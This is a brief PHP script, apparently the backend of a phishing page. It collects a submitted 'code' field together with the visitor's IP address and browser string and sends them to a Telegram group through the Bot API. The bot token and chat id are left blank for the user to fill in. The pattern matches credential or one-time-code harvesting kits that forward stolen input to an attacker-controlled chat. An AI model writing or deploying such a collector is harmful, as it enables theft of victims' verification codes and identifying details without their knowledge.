<?php
$content = '';
    
$ip = $_SERVER['REMOTE_ADDR'];
$code = $_POST['code'];
$agent = $_SERVER['HTTP_USER_AGENT'];

$content = "IP=$ip \nCode=$code \nBrowser=$agent";
echo $content;

//Put your api token here
$apiToken = "";
$data = [
    //Your group name
    'chat_id' => '',
    'text' => $content,
    'parse_mode' => 'HTML'
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($data));
?>